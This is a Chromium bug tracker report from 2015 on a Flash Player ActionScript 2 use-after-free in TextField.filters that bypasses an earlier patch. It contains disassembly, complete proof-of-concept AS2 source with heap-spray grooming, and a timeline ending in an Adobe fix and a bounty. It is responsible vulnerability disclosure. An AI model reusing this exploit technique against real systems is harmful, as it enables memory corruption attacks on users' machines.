# Security: Flash AS2 Use After Free in TextField.filters (again)

| Field | Value |
|-------|-------|
| **Issue ID** | [40081851](https://issues.chromium.org/issues/40081851) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-04-14 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

There is a use after free vulnerability in the ActionScript 2 TextField.filters array property.

This is <https://crbug.com/chromium/457278> resurrected.

**VERSION**  

Chrome Version: [?, Flash 17.0.0.169]  

Operating System: [Windows 7 x64 SP1]

**REPRODUCTION CASE**  

When the TextField.filters array is set, Flash creates an internal array holding the filters. When the property is read, Flash iterates over this array and clones each filter. During this loop, it is possible to execute some AS2 by overriding a filter's constructor. At that moment, if the AS2 code alters the filters array, Flash frees the internal array leaving a reference to freed memory in the stack. When the execution flow resumes to the loop, a use-after-free occurs.  

Note: Flash 17.0.0.169 tried to patch the previous issue by setting an "in used" flag on the targeted filter (flashplayer17\_sa.exe 17.0.0.169):

.text:004D67F8 mov esi, [esp+1Ch+var\_4]  

.text:004D67FC push 1 ; char  

.text:004D67FE mov ecx, ebp ; int  

.text:004D6800 mov byte ptr [esi+0Ch], 1 // this flag was added  

.text:004D6804 call xparseAS2Code  

.text:004D6809 mov byte ptr [esi+0Ch], 0

And when we check the function that deletes the filters:

.text:004D66D0 push edi  

.text:004D66D1 mov edi, ecx  

.text:004D66D3 cmp byte ptr [edi+0Ch], 0 // check again the flag, and jump if it is set, so that the filter won't be deleted  

.text:004D66D7 jnz short loc\_4D6716  

.text:004D66D9 cmp dword ptr [edi], 0  

.text:004D66DC jz short loc\_4D6708

We can bypass that feature with the following code:

flash.filters.GlowFilter = MyGlowFilter  

var a = tfield.filters // set the flag to 1

--- in MyGlowFilter ---  

flash.filters.GlowFilter = MyGlowFilter2  

var a = \_global.tfield.filters // set the flag to 1, and then set it to 0

```
//now we can free the filter :D, the flag is set to 0!  
_global.tfield.filters = []  

```

Tested on Flash Player standalone 17.0.0.169, the updated Chrome is not available at the time of writing.  

But since the objects haven't changed too much the updated version should crash while dereferencing 0x41424344.

Can't we call that a -1day :D?

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of FiltusPafusBis.fla

import flash.filters.GlowFilter;

var a1:Array = new Array()  

var a2:Array = new Array()  

for (i = 0; i<0x50/4;i++) {  

a2[i] = 0x41424344  

}

for (var i = 0; i<0x200;i++) {  

var tf:TextFormat = new TextFormat()  

a1[i] = tf  

}  

for (var i = 0; i<0x200;i++) {  

a1[i].tabStops = a2  

}

var tfield:TextField = createTextField("tf",1,1,2,3,4)  

var glowfilter:GlowFilter = new GlowFilter(1,2,3,4,5,6,true,true)  

tfield.filters = [glowfilter]

function f() {  

for (var i = 0; i<0x20;i++) {  

\_global.a1[0x100+i\*4].tabStops = [1,2,3,4]  

}  

flash.filters.GlowFilter = MyGlowFilter2  

var a = \_global.tfield.filters

```
_global.tfield.filters = []  
for (var i = 0; i<0x200;i++) {  
	_global.a1[i].tabStops = a2  
}  

```

}

\_global.tfield = tfield  

\_global.f = f  

\_global.a1 = a1  

\_global.a2 = a2

flash.filters.GlowFilter = MyGlowFilter  

var a = tfield.filters

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of MyGlowFilter.as:

import flash.filters.GlowFilter;  

class MyGlowFilter extends flash.filters.GlowFilter {  

public function MyGlowFilter (a,b,c,d,e,f,g,h)  

{  

super(a,b,c,d,e,f,g,h);  

\_global.f()  

}  

}

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of MyGlowFilter2.as:

import flash.filters.GlowFilter;  

class MyGlowFilter2 extends flash.filters.GlowFilter {  

public function MyGlowFilter2 (a,b,c,d,e,f,g,h)  

{  

super(a,b,c,d,e,f,g,h);  

}  

}

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of FiltusPafusBis\_poc.fla

import flash.filters.GlowFilter;

var tfield:TextField = createTextField("tf",1,1,2,3,4)  

var glowfilter:GlowFilter = new GlowFilter(1,2,3,4,5,6,true,true)  

tfield.filters = [glowfilter]

function f() {  

flash.filters.GlowFilter = MyGlowFilter2  

var a = \_global.tfield.filters  

\_global.tfield.filters = []  

}

\_global.tfield = tfield  

\_global.f = f

flash.filters.GlowFilter = MyGlowFilter  

var a = tfield.filters

## Attachments

- [FiltusPafusBis.zip](attachments/FiltusPafusBis.zip) (application/zip, 14.1 KB)

## Timeline

### in...@chromium.org (2015-04-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-04-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-04-14)

Confirm dereference trying to load vtable entry from 0x41424344, Chrome 42.0.2311.90 with Flash 17.0.0.169 on Win 7 32-bit.

### sc...@gmail.com (2015-04-14)

Adobe tracking as PSIRT-3588.

### sc...@gmail.com (2015-06-04)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-06-09)

https://helpx.adobe.com/security/products/flash-player/apsb15-11.html

### cl...@chromium.org (2015-09-15)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-10-09)

Congrats - $5000 for this report.

### ti...@google.com (2015-10-16)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-29)

Payment is on its way - should arrive in ~7 days. Thanks again for your report!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/476926?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081851)*
